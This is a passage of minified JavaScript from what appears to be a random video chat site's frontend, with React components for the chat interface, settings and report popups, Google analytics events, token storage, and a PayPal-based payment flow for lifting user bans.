      l.className = "chat__greetings-text";
      var d = {};
      d.className = "tr", d["data-tr"] = "users_online", d["data-tr-id"] = "1318";
      var D = {};
      D.className = "online_counter";
      var b = {};
      b.className = "chat__greetings-text";
      var C = {};
      return C.className = "chat__greetings-gap", config.vertical_layout ? "" : u.a.createElement("div", n, u.a.createElement("div", a), this.renderLogoOrSayHello(), u.a.createElement("div", i), u.a.createElement("div", r, u.a.createElement("div", o, u.a.createElement(Te, c, u.a.createElement("span", t, "welcome_start_button"))), u.a.createElement("div", x, u.a.createElement(He, null))), u.a.createElement("div", s), u.a.createElement("div", l, u.a.createElement("p", null, u.a.createElement("span", d, "users_online"), ": ", u.a.createElement("span", D))), u.a.createElement("div", b, this.maybeShowDisclaimer(), this.showRulesText(), this.maybeShowVkText()), u.a.createElement("div", C));
    }
  }
  var qe = Ne;
  class Ke extends u.a.Component {
    ["maybeRenderReportButton"]() {
      var e = f, n = {};
      n.className = "buttons__button report-button disabled";
      var a = {};
      a.className = "btn btn-gray";
      var i = {};
      return i.className = "tr", i["data-tr-id"] = "1322", i["data-tr"] = "report_2", config.vertical_layout ? "" : u.a.createElement("div", n, u.a.createElement("button", a, u.a.createElement("span", i, "report_2")));
    }
    ["maybeRenderGenderButton"]() {
      var e = f, n = {};
      return n.className = "buttons__button", config.vertical_layout ? u.a.createElement("div", n, u.a.createElement(He, null)) : "";
    }
    ["render"]() {
      var e = f, n = {};
      n.className = "buttons";
      var a = {};
      a.className = "buttons__wrapper";
      var i = {};
      i.className = "buttons__button start-button";
      var r = {};
      r.className = "btn-main";
      var o = {};
      o.className = "tr", o["data-tr-id"] = "1232", o["data-tr"] = "start";
      var c = {};
      c.className = "buttons__button disabled stop-button";
      var t = {};
      t.className = "btn-red";
      var x = {};
      x.className = "tr", x["data-tr-id"] = "1234", x["data-tr"] = "stop";
      var s = {};
      s.className = "buttons__button country-filter";
      var l = {};
      l.id = "country-filter-button", l.className = "btn-gray country-filter__button";
      var d = {};
      d.className = "tr", d["data-tr-id"] = "1287", d["data-tr"] = "country";
      var D = {};
      D.id = "country-selected", D.className = "flag";
      var b = {};
      b.id = "countries-all";
      var C = {};
      C.className = "tr", C["data-tr-id"] = "1288", C["data-tr"] = "all";
      var m = {};
      m.className = "country-filter-popup", m.id = "country-filter-popup";
      var v = {};
      v.className = "country-filter-popup__all-countries";
      var g = {};
      g.className = "country-filter-popup__country all tr", g["data-country"] = "ZZ", g["data-tr-id"] = "1243", g["data-tr"] = "all_countries";
      var _ = {};
      return _.className = "country-filter-popup__countries", _.id = "country-filter-list", u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement("div", i, u.a.createElement(Te, r, u.a.createElement("span", o, "start"))), u.a.createElement("div", c, u.a.createElement(Te, t, u.a.createElement("span", x, "stop"))), u.a.createElement("div", s, u.a.createElement(Te, l, u.a.createElement("span", d, "country"), u.a.createElement("i", D), u.a.createElement("span", b, " ", u.a.createElement("span", C, "all")))), u.a.createElement("div", m, u.a.createElement("div", v, u.a.createElement("div", g, "all_countries")), u.a.createElement("div", _)), this.maybeRenderReportButton(), this.maybeRenderGenderButton()));
    }
  }
  var Ue = Ke;
  class Ze extends u.a.Component {
    ["renderInput"]() {
      var e = f, n = {};
      n.className = "chat__textarea tr", n["data-tr-id"] = "1331", n["data-tr"] = "chat_placeholder", n.id = "chat-text", n.placeholder = "chat_placeholder";
      var a = {};
      return a.className = "chat__textarea tr", a["data-tr-id"] = "1331", a["data-tr"] = "chat_placeholder", a.id = "chat-text", a.placeholder = "chat_placeholder", config.vertical_layout ? u.a.createElement("input", n) : u.a.createElement("textarea", a);
    }
    ["renderAppButtons"]() {
      var e = f;
      return config.vertical_layout ? "" : u.a.createElement(se, null);
    }
    ["render"]() {
      var e = f, n = {};
      n.className = "chat-container";
      var a = {};
      a.className = "chat";
      var i = {};
      i.className = "chat__body";
      var r = {};
      r.className = "chat__greetings", r.id = "chat-greetings";
      var o = {};
      o.className = "chat__settings-button settings-button";
      var c = {};
      c.className = "chat__messages", c.id = "chat-history";
      var t = {};
      t.className = "chat__settings-button settings-button";
      var x = {};
      x.className = "chat__textfield", x.id = "chat-textfield";
      var s = {};
      s.className = "chat__resizer", s.id = "chat-resizer";
      var l = {};
      l.className = "resizer__icon horizontal";
      var d = {};
      return d.className = "chat__textarea-container", u.a.createElement("div", n, u.a.createElement(Ue, null), u.a.createElement("div", a, u.a.createElement("div", i, u.a.createElement("div", r, u.a.createElement("div", o), u.a.createElement(qe, null)), u.a.createElement("div", c, u.a.createElement("div", t)), this.renderAppButtons()), u.a.createElement("div", x, u.a.createElement("div", s, u.a.createElement("div", l)), u.a.createElement("div", d, this.renderInput()))));
    }
  }
  var Ge, Ye, Ve, Ie = Ze;
  function We(e, n) {
    return function (e) {
      if (Array.isArray(e)) return e;
    }(e) || function (e, n) {
      var a = _0x28ad;
      if ("undefined" != typeof Symbol && Symbol.iterator in Object(e)) {
        var f = [], i = true, u = false, r = void 0;
        try {
          for (var o, c = e[Symbol.iterator](); !(i = (o = c.next()).done) && (f.push(o.value), !n || f.length !== n); i = true) ;
        } catch (e) {
          u = true, r = e;
        } finally {
          try {
            i || null == c.return || c.return();
          } finally {
            if (u) throw r;
          }
        }
        return f;
      }
    }(e, n) || function (e, n) {
      var a = _0x28ad;
      if (e) {
        if ("string" == typeof e) return Je(e, n);
        var f = Object.prototype.toString.call(e).slice(8, -1);
        return "Object" === f && e.constructor && (f = e.constructor.name), "Map" === f || "Set" === f ? Array.from(e) : "Arguments" === f || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(f) ? Je(e, n) : void 0;
      }
    }(e, n) || function () {
      throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    }();
  }
  function Je(e, n) {
    var a = f;
    (null == n || n > e.length) && (n = e.length);
    for (var i = 0, u = new Array(n); i < n; i++) u[i] = e[i];
    return u;
  }
  function Re(e, n) {
    var a = f;
    if (null == e) return {};
    var i, u, r = function (e, n) {
      var a = _0x28ad;
      if (null == e) return {};
      var f, i, u = {}, r = Object.keys(e);
      for (i = 0; i < r.length; i++) f = r[i], n.indexOf(f) >= 0 || (u[f] = e[f]);
      return u;
    }(e, n);
    if (Object.getOwnPropertySymbols) {
      var o = Object.getOwnPropertySymbols(e);
      for (u = 0; u < o.length; u++) i = o[u], n.indexOf(i) >= 0 || Object.prototype.propertyIsEnumerable.call(e, i) && (r[i] = e[i]);
    }
    return r;
  }
  function Oe(e, n) {
    var a = f, i = Object.keys(e);
    if (Object.getOwnPropertySymbols) {
      var u = Object.getOwnPropertySymbols(e);
      n && (u = u.filter(function (n) {
        var f = a;
        return Object.getOwnPropertyDescriptor(e, n).enumerable;
      })), i.push.apply(i, u);
    }
    return i;
  }
  function Xe(e) {
    for (var n = f, a = 1; a < arguments.length; a++) {
      var i = null != arguments[a] ? arguments[a] : {};
      a % 2 ? Oe(Object(i), true).forEach(function (n) {
        $e(e, n, i[n]);
      }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : Oe(Object(i)).forEach(function (a) {
        var f = n;
        Object.defineProperty(e, a, Object.getOwnPropertyDescriptor(i, a));
      });
    }
    return e;
  }
  function $e(e, n, a) {
    var i = f, u = {};
    return u.value = a, u.enumerable = true, u.configurable = true, u.writable = true, n in e ? Object.defineProperty(e, n, u) : e[n] = a, e;
  }
  function Qe(e) {
    var n = f;
    return (Qe = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      var a = n;
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    })(e);
  }
  function en(e, n) {
    var a = f, i = document.querySelector('script[src="'.concat(e, '"]'));
    if (null === i) return null;
    var u = fn(e, n);
    if (Object.keys(i.dataset).length !== Object.keys(u.dataset).length) return null;
    var r = true;
    return Object.keys(i.dataset).forEach(function (e) {
      var n = a;
      i.dataset[e] !== u.dataset[e] && (r = false);
    }), r ? i : null;
  }
  function nn(e) {
    var n = f, a = e.url, i = e.attributes, u = e.onSuccess, r = e.onError, o = fn(a, i);
    o.onerror = r, o.onload = u, document.head.insertBefore(o, document.head.firstElementChild);
  }
  function an(e) {
    var n = f, a = "https://www.paypal.com/sdk/js";
    e.sdkBaseURL && (a = e.sdkBaseURL, delete e.sdkBaseURL);
    var i = {};
    i.queryParams = {}, i.dataAttributes = {};
    var u, r, o, c = function (e, a) {
      var f = n, i = "", u = "";
      Array.isArray(e) ? e.length > 1 ? (i = "*", u = e.toString()) : i = e.toString() : "string" == typeof e && e.length > 0 ? i = e : "string" == typeof a && a.length > 0 && (i = "*", u = a);
      var r = {};
      return r["merchant-id"] = i, r["data-merchant-id"] = u, r;
    }(e["merchant-id"], e["data-merchant-id"]), t = Object.assign(e, c), x = Object.keys(t).filter(function (e) {
      return void 0 !== t[e] && null !== t[e] && "" !== t[e];
    }).reduce(function (e, a) {
      var f = n, i = t[a].toString();
      return "data-" === a.substring(0, 5) ? e.dataAttributes[a] = i : e.queryParams[a] = i, e;
    }, i), s = x.queryParams, l = x.dataAttributes, d = {};
    return d.url = "".concat(a, "?").concat((u = s, r = f, o = "", Object.keys(u).forEach(function (e) {
      0 !== o.length && (o += "&"), o += e + "=" + u[e];
    }), o)), d.dataAttributes = l, d;
  }
  function fn(e) {
    var n = f, a = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}, i = document.createElement("script");
    return i.src = e, Object.keys(a).forEach(function (e) {
      var f = n;
      i.setAttribute(e, a[e]), "data-csp-nonce" === e && i.setAttribute("nonce", a["data-csp-nonce"]);
    }), i;
  }
  function un(e) {
    var n = f, a = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : rn();
    cn(e, a);
    var i = e.url, u = e.attributes;
    if ("string" != typeof i || 0 === i.length) throw new Error("Invalid url.");
    if (void 0 !== u && "object" !== Qe(u)) throw new Error("Expected attributes to be an object.");
    return new a(function (e, a) {
      var f = n;
      if ("undefined" == typeof window) return e();
      var r = {};
      r.url = i, r.attributes = u, r.onSuccess = function () {
        return e();
      }, r.onError = function () {
        var e = f;
        return a(new Error('The script "'.concat(i, '" failed to load.')));
      }, nn(r);
    });
  }
  function rn() {
    var e = f;
    if ("undefined" == typeof Promise) throw new Error("Promise is undefined. To resolve the issue, use a Promise polyfill.");
    return Promise;
  }
  function on(e) {
    return window[e];
  }
  function cn(e, n) {
    var a = f;
    if ("object" !== Qe(e) || null === e) throw new Error("Expected an options object.");
    if (void 0 !== n && "function" != typeof n) throw new Error("Expected PromisePonyfill to be a function.");
  }
  (Ye = Ge || (Ge = {}))[(Ve = f)("0x86d")] = "pending", Ye.REJECTED = "rejected", Ye.RESOLVED = "resolved";
  var tn = Object(i.createContext)(null), xn = Object(i.createContext)(null);
  function sn(e, n) {
    var a = f;
    switch (n.type) {
      case "setLoadingStatus":
        var i = {};
        return i.options = Xe({}, e.options), i.loadingStatus = n.value, i;
      case "resetOptions":
        var u = {};
        return u.loadingStatus = Ge.PENDING, u.options = n.value, u;
      default:
        return e;
    }
  }
  function ln(e) {
    var n = f, a = e.options, r = e.children, o = {options: a, loadingStatus: Ge.PENDING}, c = We(Object(i.useReducer)(sn, o), 2), t = c[0], x = c[1];
    return Object(i.useEffect)(function () {
      var e = n;
      if (t.loadingStatus === Ge.PENDING) {
        var a = true;
        return function (n) {
          var a = e, f = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : rn();
          if (cn(n, f), "undefined" == typeof window) return f.resolve(null);
          var i = an(n), u = i.url, r = i.dataAttributes, o = r["data-namespace"] || "paypal", c = on(o);
          return en(u, r) && c ? f.resolve(c) : un({url: u, attributes: r}, f).then(function () {
            var e = a, n = on(o);
            if (n) return n;
            throw new Error("The window.".concat(o, " global variable is not available."));
          });
        }(t.options).then(function () {
          var n = e, f = {};
          f.type = "setLoadingStatus", f.value = Ge.RESOLVED, a && x(f);
        }).catch(function () {
          var n = e, f = {};
          f.type = "setLoadingStatus", f.value = Ge.REJECTED, a && x(f);
        }), function () {
          a = false;
        };
      }
    }), u.a.createElement(tn.Provider, {value: t}, u.a.createElement(xn.Provider, {value: x}, r));
  }
  function dn(e) {
    var n = f, a = e.className, r = void 0 === a ? "" : a, o = e.disabled, c = void 0 !== o && o, t = e.forceReRender, x = Re(e, ["className", "disabled", "forceReRender"]), s = We(function () {
      var e = f, n = Object(i.useContext)(tn), a = Object(i.useContext)(xn);
      if (null === n || null === a) throw new Error("usePayPalScriptReducer must be used within a PayPalScriptProvider");
      var u = n.loadingStatus, r = {};
      return r.isPending = u === Ge.PENDING, r.isResolved = u === Ge.RESOLVED, r.isRejected = u === Ge.REJECTED, [Xe(Xe({}, Re(n, ["loadingStatus"])), {}, r), a];
    }(), 1)[0], l = s.isResolved, d = s.options, D = Object(i.useRef)(null), b = Object(i.useRef)(null), C = We(Object(i.useState)(null), 2), m = C[0], v = C[1], g = We(Object(i.useState)(null), 2)[1];
    function _() {
      var e = n;
      null !== b.current && b.current.close();
    }
    Object(i.useEffect)(function () {
      var e = n;
      return false === l ? _ : void 0 === window.paypal || void 0 === window.paypal.Buttons ? (g(function () {
        throw new Error(function (e) {
          var n = _0x28ad, a = e.components, f = void 0 === a ? "" : a, i = "Unable to render <PayPalButtons /> because window.paypal.Buttons is undefined.";
          if (f.length && !f.includes("buttons")) {
            var u = "".concat(f, ",buttons");
            i += "\nTo fix the issue, add 'buttons' to the list of components passed to the parent PayPalScriptProvider:" + "\n`<PayPalScriptProvider options={{ components: '".concat(u, "'}}>`.");
          }
          return i;
        }(d));
      }), _) : (b.current = window.paypal.Buttons(Xe(Xe({}, x), {}, {onInit: function (n, a) {
        var f = e;
        v(a), "function" == typeof x.onInit && x.onInit(n, a);
      }})), false === b.current.isEligible() || null === D.current || b.current.render(D.current).catch(function (n) {
        var a = e;
        null !== D.current && 0 !== D.current.children.length && g(function () {
          var e = a;
          throw new Error("Failed to render <PayPalButtons /> component. ".concat(n));
        });
      }), _);
    }, [l, t, x.fundingSource]), Object(i.useEffect)(function () {
      var e = n;
      null !== m && (true === c ? m.disable() : m.enable());
    }, [c, m]);
    var h = {};
    h.opacity = .33;
    var w = c ? h : {}, p = "".concat(r, " ").concat(c ? "paypal-buttons-disabled" : "").trim(), y = {};
    return y.ref = D, y.style = w, y.className = p, u.a.createElement("div", y);
  }
  const Dn = e => {
    var n = f;
    if (e.ok) return e.json();
    throw "fail";
  };
  var bn = class {
    constructor(e) {
      var n, a, i = f, u = {};
      u["client-id"] = config.paypal_client_id, u.currency = "USD", u.intent = "capture", a = u, (n = "options") in this ? Object.defineProperty(this, n, {value: a, enumerable: true, configurable: true, writable: true}) : this[n] = a, this.banId = e.BanId;
      try {
        this.customData = JSON.parse(e.CustomData), this.options.currency = this.customData.paypal_currency;
      } catch (e) {
        console.log(e);
      }
    }
    ["init"]() {
      var e = f;
      return this.customData ? Promise.resolve() : fetch(config.api_url + "/api/v1/bans/" + this.banId + "/paypal_config").then(Dn).then(n => Object.assign(this.options, n)).catch(e => Locker());
    }
    ["createOrder"](e, n) {
      var a = f, i = {};
      return i.ban_id = this.banId, this.request("paypal_orders", i).then(e => e.ok ? e.json() : Helper.reload()).then(e => e.id);
    }
    ["onApprove"](e, n) {
      var a = f, i = {};
      return i.ban_id = this.banId, i.receipt = e.orderID, this.request("unbans/paypal", i);
    }
    ["request"](e, n = {}) {
      var a = f, i = {};
      i["Content-Type"] = "application/json";
      var u = {};
      return u.method = "post", u.body = JSON.stringify(n), u.headers = i, fetch(config.api_url + "/api/v2/" + e, u);
    }
  }, Cn = {BanId: 1234567899, Reason: [0, 1, 2, 3, 4, 5][Math.floor(5 * Math.random())], ExpiresAt: (new Date).getTime() + 12096e5, Picture: "http://fakeimg.pl/160x160/282828/eae0d0/?text=unban me plz", Quote: Helper.queryParam("quote") && decodeURIComponent(Helper.queryParam("quote")), CustomData: JSON.stringify({paypal_currency: Helper.queryParam("currency") || "USD"})}, mn = class {
    static ["init"]() {
      var e = f;
      window.dataLayer = window.dataLayer || [], window.gtag = function () {
        var n = e;
        dataLayer.push(arguments);
      };
      const n = document.createElement("script");
      n.async = true, n.src = "https://www.googletagmanager.com/gtag/js?id=" + config.gtag_id, document.body.appendChild(n), gtag("js", new Date), gtag("config", config.gtag_id), Helper.queryParam("conversion") && (this.conversion(), history.replaceState({}, "", window.location.pathname));
    }
    static ["conversion"]() {
      var e = f, n = {};
      n.send_to = config.gtag_conversion_id, gtag("event", "conversion", n);
    }
    static ["pageView"](e) {
      var n = f, a = {};
      a.send_to = config.gtag_id, a.origin_id = config.origin, a.locale = navigator.language, a.country = e.country, a.hpu = e.isPayer, a.pun = e.unbanNum, a.is_fm = e.attachedData.isFemale, gtag("event", "page_view", a);
    }
    static ["checkout"]() {
      var e = f, n = {};
      n.send_to = config.gtag_checkout_id, gtag("event", "conversion", n);
    }
  };
  const vn = e => String(e).padStart(2, "0");
  class gn extends u.a.Component {
    constructor(e) {
      var n = f;
      super(e), this.popupRef = u.a.createRef(), this.state = {timer: "", checkoutReady: false, waitingForUnban: false};
    }
    ["componentDidUpdate"](e, n, a) {
      var i = f, u = {};
      u.checkoutReady = true, this.props.ban.BanId && !e.ban.BanId && (Overlay.show(this.popupRef.current), this.startTimer(), this.paypal = new bn(this.props.ban), this.paypal.init(true).then(() => this.setState(u)));
    }
    ["render"]() {
      var e = f;
      const n = this.props.ban;
      if (!n.BanId) return "";
      const a = config.rules_link + "#" + n.Reason, i = "popup popup-gray ban-popup " + (6 === n.Reason && "disabled");
      var r = {};
      r.id = "ban-popup", r.className = i, r.ref = this.popupRef;
      var o = {};
      o.className = "ban-popup__body";
      var c = {};
      c.className = "ban-popup__row";
      var x = {};
      x.className = "ban-popup__image";
      var s = {};
      s.className = "ban-popup__image-wrap";
      var l = {};
      l.className = "ban-image", l.src = n.Picture;
      var d = {};
      d.className = "ban-popup__data";
      var D = {};
      D.className = "tr data-item", D["data-tr-id"] = "1251", D["data-tr"] = "ban_message";
      var b = {};
      b.className = "data-item";
      var C = {};
      C.className = "tr", C["data-tr-id"] = "1253", C["data-tr"] = "ban_reason";
      var m = {};
      m.href = a, m.target = "_blank";
      var v = {};
      v.className = "ban-popup__unban_msg tr", v["data-tr-id"] = "1262", v["data-tr"] = "unban_message";
      var g = {};
      g.className = "ban-popup__tabs";
      var _ = {};
      _.className = "ban-popup__tabs-tab", _["data-target"] = "paypal";
      var h = {};
      h.className = "ban-popup__action";
      var w = {};
      w.className = "ban-popup__payment paypal";
      var p = {};
      p.className = "ban-popup__button paypal";
      var y = {};
      y.className = "ban-popup__support-link";
      var z = {};
      return z.className = "ban-popup__ban-id", u.a.createElement("div", r, u.a.createElement("div", o, u.a.createElement("div", c, u.a.createElement("div", x, u.a.createElement("div", s, u.a.createElement("img", l))), u.a.createElement("div", d, u.a.createElement("div", D, t("ban_message")), u.a.createElement("div", b, u.a.createElement("span", C, t("ban_reason")), " ", u.a.createElement("a", m, t("ban_reason_" + n.Reason)), u.a.createElement("div", null, 4 === n.Reason && t("ban_reason_description"))), this.renderTimer(n), this.renderBanQuote(n))), u.a.createElement("div", v, !config.is_vk_app && t("unban_message"))), u.a.createElement("ul", g, u.a.createElement("li", _, "PayPal/Платёжная карта")), u.a.createElement("div", h, u.a.createElement("div", w, u.a.createElement("div", p, this.renderUnbanButton(), this.renderPreloader())), u.a.createElement("div", y, u.a.createElement("a", {href: "mailto:" + config.ban_email, target: "_blank"}, config.ban_email)), u.a.createElement("div", z, "ID: ", u.a.createElement("span", null, n.BanId))));
    }
    ["renderPreloader"]() {
      var e = f, n = {};
      return n.className = "ban-preloader", this.state.checkoutReady && !this.state.waitingForUnban ? "" : u.a.createElement("div", n);
    }
    ["renderUnbanButton"]() {
      var e = f;
      if (config.is_vk_app) return "";
      if (!this.state.checkoutReady || this.state.waitingForUnban) return "";
      const n = this.paypal;
      var a = {};
      a.options = n.options;
      var i = {};
      i.layout = "vertical", i.tagline = false;
      var r = {};
      return r.createOrder = this.createOrder.bind(this), r.onApprove = this.onApprove.bind(this), r.onError = this.onError, r.style = i, u.a.createElement(ln, a, u.a.createElement(dn, r));
    }
    ["createOrder"]() {
      var e = f;
      return mn.checkout(), this.paypal.createOrder();
    }
    ["onApprove"](e, n) {
      var a = f, i = {};
      return i.waitingForUnban = true, this.setState(i), mn.conversion(), this.paypal.onApprove(e, n).then(Helper.reload);
    }
    ["renderBanQuote"](e) {
      var n = f, a = {};
      return a.className = "ban-quote", e.Quote ? u.a.createElement("div", a, emojione.toImage(e.Quote)) : "";
    }
    ["renderTimer"]() {
      var e = f, n = {};
      n.className = "timer data-item";
      var a = {};
      return a.className = "tr", a["data-tr-id"] = "1252", a["data-tr"] = "ban_duration", this.secondsLeft && this.secondsLeft > 31536e3 ? "" : u.a.createElement("div", n, u.a.createElement("span", a, t("ban_duration")), " ", u.a.createElement("span", null, this.state.timer));
    }
    ["startTimer"]() {
      var e = f;
      this.secondsLeft = (new Date(this.props.ban.ExpiresAt).getTime() - (new Date).getTime()) / 1e3, this.tick(), setInterval(this.tick.bind(this), 1e3);
    }
    ["tick"]() {
      var e = f;
      this.secondsLeft -= 1;
      const n = Math.floor(this.secondsLeft / 3600), a = this.secondsLeft % 3600, i = Math.floor(a / 60), u = Math.floor(a % 60), r = vn(n) + ":" + vn(i) + ":" + vn(u);
      var o = {};
      o.timer = r, this.setState(o), 0 === this.secondsLeft && Helper.reload();
    }
    ["onError"](e, n) {
      Helper.reload();
    }
  }
  var _n = te(e => {
    var n = f;
    let a = Object.assign({}, e.ban.test ? Cn : e.ban);
    return e.ban.test || (a.Picture = "data:image/jpeg;base64," + a.Picture), {ban: a};
  })(gn);
  function hn(e) {
    var n = f;
    return !(!e.token || !(e.chatSnData && e.chatSnSign || e.SnDataStr && e.SnHmac));
  }
  var wn = class {
    constructor(e) {
      var n = f;
      this.socket = e, this.retrieveToken();
    }
    ["init"]() {
      var e = f;
      this.isLoggedIn() ? ductTape.snSignIn() : window.addEventListener("message", this.loginCallback.bind(this));
    }
    ["loginCallback"](e) {
      var n = f, a = {};
      a.token = e.data.setAuthToken, a.SnDataStr = e.data.videochatDataStr, a.SnHmac = e.data.videochatHmac;
      const i = a;
      hn(i) && (this.storeToken(i), this.notifySn(e.data), this.socket && this.socket.close(), ductTape.snSignIn());
    }
    ["apiCallback"](e) {
      var n = f, a = {};
      a.token = e.token, a.SnDataStr = e.videochatDataStr, a.SnHmac = e.videochatHmac;
      const i = a;
      hn(i) && (Helper.getCookie("API_KEY") || this.notifySn(e), this.storeToken(i));
    }
    ["notifySn"](e) {
      var n = f;
      config.sn && "sn" !== e.source && window.parent.postMessage({source: "videochat"}, location.origin);
    }
    ["isLoggedIn"]() {
      return hn(this.tokenData);
    }
    ["storeToken"](e) {
      var n = f;
      if (e) try {
        localStorage.setItem("snid", JSON.stringify(e)), this.tokenData = e;
        let a = location.hostname;
        "localhost" !== a && (a = "." + a), document.cookie = "API_KEY=" + e.token + "; Max-Age=31536000; domain=" + a + "; path=/; secure=true";
      } catch (e) {}
    }
    ["retrieveToken"]() {
      var e = f;
      try {
        this.tokenData = JSON.parse(localStorage.getItem("snid") || "{}");
      } catch (n) {
        this.logout();
      }
    }
    ["logout"]() {
      var e = f, n = {};
      n.logout = true, localStorage.removeItem("snid"), document.cookie = "API_KEY=; Max-Age=-99999999;", config.sn ? this.notifySn(n) : Helper.reload();
    }
  };
  class pn extends u.a.Component {
    ["render"]() {
      var e = f, n = {};
      n.id = "settings-popup", n.className = "popup popup-gray settings-popup", n.onClick = this.handlePopupClick;
      var a = {};
      a.className = "close-popup";
      var i = {};
      i.className = "popup-header";
      var r = {};
      r.className = "tr", r["data-tr-id"] = "504", r["data-tr"] = "settings";
      var o = {};
      o.className = "popup-close close-popup";
      var c = {};
      c.className = "settings-popup-content";
      var t = {};
      t.className = "language-selector";
      var x = {};
      x.className = "language-selector__btn btn-container-sm";
      var s = {};
      s.id = "language-selector-button", s.className = "btn-gray";
      var l = {};
      l.className = "tr", l["data-tr-id"] = "1320", l["data-tr"] = "language";
      var d = {};
      d.id = "language-selector-label";
      var D = {};
      D.className = "language-selector__popup", D.id = "language-selector-popup";
      var b = {};
      b.className = "language-selector__popup-wrapper";
      var C = {};
      C.className = "settings-popup__translation-toggle";
      var m = {};
      m.className = "tr", m["data-tr"] = "translate_messages", m["data-tr-id"] = "1319";
      var v = {};
      v.className = "toggle toggle--on-off";
      var g = {};
      g.className = "toggle__input", g.type = "checkbox", g.id = "translate-messages";
      var _ = {};
      return _.className = "toggle__label", _["data-tr-id"] = "1285/1286", _["data-yes"] = "yes", _["data-no"] = "no", u.a.createElement("div", n, u.a.createElement("div", a), u.a.createElement("div", i, u.a.createElement("span", r, "settings"), u.a.createElement("span", o)), u.a.createElement("div", c, this.maybeRenderGenderSelector(), u.a.createElement("div", t, u.a.createElement("div", x, u.a.createElement(Te, s, u.a.createElement("span", l, "language"), u.a.createElement("span", null, ": "), u.a.createElement("span", d))), u.a.createElement("div", D, u.a.createElement("div", b))), u.a.createElement("div", C, u.a.createElement("p", null, u.a.createElement("span", m, "translate_messages")), u.a.createElement("div", v, u.a.createElement("input", g), u.a.createElement("label", _))), this.maybeRenderSignUpButton()), this.maybeRenderFooter());
    }
    ["handlePopupClick"](e) {
      var n = f;
      e.stopPropagation(), e.nativeEvent.stopImmediatePropagation();
    }
    ["maybeRenderGenderSelector"]() {
      var e = f;
      return config.vertical_layout ? u.a.createElement(He, null) : "";
    }
    ["maybeRenderSignUpButton"]() {
      var e = f, n = {};
      n.className = "settings-popup__sign-up";
      var a = {};
      a.className = "btn-main", a.onClick = this.logout;
      var i = {};
      i.className = "tr", i["data-tr"] = "log_out", i["data-tr-id"] = "70";
      var r = {};
      r.className = "settings-popup__sign-up";
      var o = {};
      o.className = "btn-main", o.onClick = this.showLoginPopup;
      var c = {};
      c.className = "tr", c["data-tr"] = "log_in", c["data-tr-id"] = "19";
      var t = {};
      t.className = "settings-popup__ok";
      var x = {};
      return x.className = "btn-main ok close-popup", config.env ? this.props.authorized ? u.a.createElement("div", n, u.a.createElement(Te, a, u.a.createElement("span", i, _.translate("log_out")))) : u.a.createElement("div", r, u.a.createElement(Te, o, u.a.createElement("span", c, _.translate("log_in")))) : u.a.createElement("div", t, u.a.createElement(Te, x, u.a.createElement("span", null, "OK")));
    }
    ["maybeRenderFooter"]() {
      var e = f, n = {};
      n.className = "popup-footer";
      var a = {};
      a.className = "popup-footer__button";
      var i = {};
      return i.className = "btn-main ok close-popup", config.env ? "" : u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement(Te, i, u.a.createElement("span", null, "OK"))));
    }
    ["showLoginPopup"]() {
      var e = f;
      window.rComponents.loginPopup.show();
    }
    ["logout"]() {
      var e = f;
      (new wn).logout();
    }
  }
  var yn = te(e => ({authorized: e.snAuth.authorized}))(pn);
  class zn extends u.a.Component {
    ["render"]() {
      var e = f, n = {};
      n.id = "report-popup", n.className = "popup popup-gray report-popup";
      var a = {};
      a.className = "popup-header";
      var i = {};
      i.className = "tr", i["data-tr-id"] = "1322", i["data-tr"] = "report_2";
      var r = {};
      r.className = "popup-close";
      var o = {};
      o.className = "report-popup__body";
      var c = {};
      c.className = "report-popup__image";
      var t = {};
      t.className = "report-popup__image-wrap";
      var x = {};
      x.id = "report-screen", x.className = "report-image", x.src = "";
      var s = {};
      s.className = "report-popup__message";
      var l = {};
      l.className = "ban-quote-container";
      var d = {};
      d.className = "ban-quote";
      var D = {};
      D.className = "tr", D["data-tr-id"] = "1240", D["data-tr"] = "report_message";
      var b = {};
      b.className = "report-popup__buttons";
      var C = {};
      C.className = "report-popup__button";
      var m = {};
      m.className = "btn-main send-report";
      var v = {};
      v.className = "tr", v["data-tr-id"] = "1285", v["data-tr"] = "yes";
      var g = {};
      g.className = "report-popup__button";
      var _ = {};
      _.className = "btn-gray";
      var h = {};
      h.className = "tr", h["data-tr-id"] = "1286", h["data-tr"] = "no";
      var w = {};
      w.className = "popup-footer";
      var p = {};
      p.className = "popup-footer__button";
      var y = {};
      y.className = "btn-main send-report";
      var z = {};
      z.className = "tr", z["data-tr-id"] = "1285", z["data-tr"] = "yes";
      var B = {};
      B.className = "popup-footer__button";
      var L = {};
      L.className = "btn-gray";
      var M = {};
      return M.className = "tr", M["data-tr-id"] = "1286", M["data-tr"] = "no", u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement("span", i, "report_2"), u.a.createElement("span", r)), u.a.createElement("div", o, u.a.createElement("div", c, u.a.createElement("div", t, u.a.createElement("img", x))), u.a.createElement("div", s, u.a.createElement("div", l, u.a.createElement("div", d)), u.a.createElement("div", D, "report_message"), u.a.createElement("div", b, u.a.createElement("div", C, u.a.createElement(Te, m, u.a.createElement("div", v, "yes"))), u.a.createElement("div", g, u.a.createElement(Te, _, u.a.createElement("div", h, "no")))))), u.a.createElement("div", w, u.a.createElement("div", p, u.a.createElement(Te, y, u.a.createElement("div", z, "yes"))), u.a.createElement("div", B, u.a.createElement(Te, L, u.a.createElement("div", M, "no")))));
    }
  }
  var Bn = zn;
  class Ln extends u.a.Component {
    ["render"]() {
      var e = f;
      const n = "app-popup " + config.env, a = "app-popup-img-android " + config.android_app, i = "app-popup-img-ios " + config.ios_app;
      var r = {};
      r.id = "app-popup", r.className = n;
      var o = {};
      o.className = "app-popup-img";
      var c = {};
      c.className = a, c.href = config.android_app_url, c.target = "_blank", c.rel = "noopener";
      var t = {};
      t.className = i, t.href = config.ios_app_url, t.target = "_blank", t.rel = "noopener nofollow";
      var x = {};
      x.className = "app-popup-buttons";
